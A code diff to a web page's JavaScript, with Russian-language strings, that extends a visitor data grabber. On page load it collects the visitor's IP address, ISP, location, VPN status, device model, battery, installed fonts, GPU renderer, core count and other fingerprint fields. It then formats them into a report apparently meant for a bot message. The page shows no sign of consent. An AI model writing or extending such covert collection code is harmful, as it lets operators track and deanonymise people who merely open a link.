@@ -73,11 +73,42 @@
         language: navigator.language,
         platform: navigator.platform,
         uptime: Math.round(performance.now() / 1000),
-        webglSupport: supportsWebGL(),
+        webglSupport: supportsWebGL() ? 'Поддерживается' : 'Не поддерживается', // Обновляем эту строку
         fonts: await getFonts(),
         renderTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
-        osVersion: 'Unknown'  // Добавляем поле для версии ОС
+        osVersion: 'Unknown',
+        cores: navigator.hardwareConcurrency || 'Неизвестно',
+        colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Темная' : 'Светлая',
+        touchPoints: navigator.maxTouchPoints || 'Недоступно',
+        language: await getLanguageName(navigator.language.split('-')[0]),
+        colorDepth: window.screen.colorDepth ? `${window.screen.colorDepth}-bit` : 'Недоступно'
     };
+
+    function getBrowserInfo() {
+        const userAgent = navigator.userAgent;
+        let name = 'Unknown';
+        let version = 'Unknown';
+
+        if (/chrome|crios|crmo/i.test(userAgent)) {
+            name = 'Chrome';
+            const match = userAgent.match(/(?:chrome|crios|crmo)\/([0-9\.]+)/i);
+            version = match ? match[1] : 'Unknown';
+        } else if (/firefox|iceweasel|fxios/i.test(userAgent)) {
+            name = 'Firefox';
+            const match = userAgent.match(/firefox\/([0-9\.]+)/i);
+            version = match ? match[1] : 'Unknown';
+        } else if (/safari/i.test(userAgent)) {
+            name = 'Safari';
+            const match = userAgent.match(/version\/([0-9\.]+)/i);
+            version = match ? match[1] : 'Unknown';
+        } else if (/msie|trident/i.test(userAgent)) {
+            name = 'Internet Explorer';
+            const match = userAgent.match(/(?:msie |rv:)([0-9\.]+)/i);
+            version = match ? match[1] : 'Unknown';
+        }
+
+        return { name, version };
+    }
 
     if (/android/i.test(userAgent)) {
         deviceInfo.device = 'Android';
@@ -196,6 +227,8 @@
     return type;
 }
 
+
+
 async function getLanguagePreference() {
     const languageMap = {
         'ru': 'Русский',
@@ -219,11 +252,43 @@ async function getLanguagePreference() {
         'tl': 'Тагальский'
     };
 
-    return navigator.languages.map(lang => {
+    const languages = navigator.languages.map(lang => {
         const [languageCode] = lang.split('-');
         return languageMap[languageCode] || 'Неизвестный язык';
-    }).join(', ');
+    });
+
+    // Удаление дубликатов
+    const uniqueLanguages = Array.from(new Set(languages));
+
+    return uniqueLanguages.join(', ');
 }
+
+async function getLanguageName(languageCode) {
+    const languageMap = {
+        'ru': 'Русский',
+        'en': 'Английский',
+        'uk': 'Украинский',
+        'es': 'Испанский',
+        'fr': 'Французский',
+        'de': 'Немецкий',
+        'it': 'Итальянский',
+        'pt': 'Португальский',
+        'zh': 'Китайский',
+        'ja': 'Японский',
+        'ko': 'Корейский',
+        'ar': 'Арабский',
+        'hi': 'Хинди',
+        'bn': 'Бенгальский',
+        'pa': 'Пенджабский',
+        'jv': 'Яванский',
+        'ms': 'Малайский',
+        'vi': 'Вьетнамский',
+        'tl': 'Тагальский'
+    };
+
+    return languageMap[languageCode] || 'Неизвестный язык';
+}
+
 
 async function getCompleteInfo() {
     const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -240,25 +305,25 @@ async function getCompleteInfo() {
     const deviceBrandAndModel = await getDeviceBrandAndModel();
     const networkType = await getNetworkType();
     const languagePreference = await getLanguagePreference();
+    const currentTime = new Date().toLocaleString(); // Определяем текущее время
 
     const ispData = await fetchData();
     const internetSpeed = await checkInternetSpeed();
 
     const browserInfo = `User Agent: ${navigator.userAgent}\nBrowser Name: ${navigator.appName}`;
-   
     const osInfo = `Platform: ${navigator.platform}`;
     const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const platformInfo = `CPU Class: ${navigator.cpuClass || 'Unknown'}`;
 
     const canvas = document.createElement('canvas');
     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    const graphicsInfo = gl ? `Vendor: ${gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_VENDOR_WEBGL)}\nRenderer: ${gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL)}` : 'WebGL не поддерживается';
+    const graphicsInfo = gl ? `Графический процессор: ${gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL)}` : 'WebGL не поддерживается';
 
     const memoryInfo = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Не поддерживается';
     const hasFlash = !!navigator.mimeTypes['application/x-shockwave-flash'];
 
     let message = `
-         🌐  Информация об IP и сети:
+    🌍 Информация о IP и сети:
 ├ IP-адрес: ${ipAddress}
 ├ Провайдер: ${isp}
 ├ Интернет-провайдер: ${ispData.isp}
@@ -268,41 +333,47 @@ async function getCompleteInfo() {
 ├ Скорость интернета: ${internetSpeed} Mbps
 └ Использование VPN / Proxy: ${vpnStatus}
 
-🌍 Информация о локации и времени:
+🗺 Информация о локации и времени:
 ├ Местоположение: ${location}
-└ Таймзона пользователя: ${timeZone}
+├ Таймзона пользователя: ${timeZone}
+└ Время устройства: ${currentTime}
 
- 📲 Информация об устройстве:
+📲 Информация об устройстве:
 ├ Операционная система: ${deviceInfo.device}
 ├ Бренд устройства: ${deviceBrandAndModel.brand}
 ├ Название модели: ${deviceBrandAndModel.model}
 ├ Версия OS: ${deviceInfo.osVersion}
 ├ Разрешение экрана: ${deviceInfo.screenResolution}
 ├ Уровень заряда батареи: ${deviceInfo.batteryLevel}
+├ Предпочтительная цветовая тема: ${deviceInfo.colorScheme}
+├ Максимальные точки касания: ${deviceInfo.touchPoints}
 ├ Оперативная память устройства: ${memoryInfo}
-├ Информация о видеокарте: ${graphicsInfo}
+├ Количество ядер: ${deviceInfo.cores}
+├ ${graphicsInfo}
 └ Поддержка WebGL: ${deviceInfo.webglSupport}
+
+🌐 Информация о браузере:
+├ Название браузера: ${deviceInfo.browser}
+└ User Agent: ${navigator.userAgent}
 
 🌀 Информация о платформе и системе:
 ├ Платформа: ${deviceInfo.platform}
 ├ Информация об ОС: ${osInfo}
 ├ Детальная статистика о платформе: ${platformInfo}
+├ Глубина цвета: ${deviceInfo.colorDepth}
 └ Время работы системы:  ${deviceInfo.uptime} сек.
 
 ⚠️ Информация о пользовательских настройках:
-├ Язык: ${deviceInfo.language}
+├ Родной язык: ${deviceInfo.language}
 ├ Языковые предпочтения: ${languagePreference}
 └ Установленные шрифты: ${deviceInfo.fonts}
 
 🏍 Информация о производительности:
 └ Время рендеринга страницы: ${deviceInfo.renderTime} мс
-    `;
+`;
 
     if (deviceBrandAndModel.model !== 'Unknown') {
-     
-
         const inlineButtonUrl = `https://www.google.com/search?q=Модель+устройства%3A+${encodeURIComponent(deviceBrandAndModel.model)}&client=ms`;
-
         const inlineButton = {
             text: `Узнать больше о модели ${deviceBrandAndModel.model}`,
             url: inlineButtonUrl
@@ -492,4 +563,4 @@ async function getChargingStatusButton() {
         }
     </script> 
 </body>
-</html> 
+</html>  
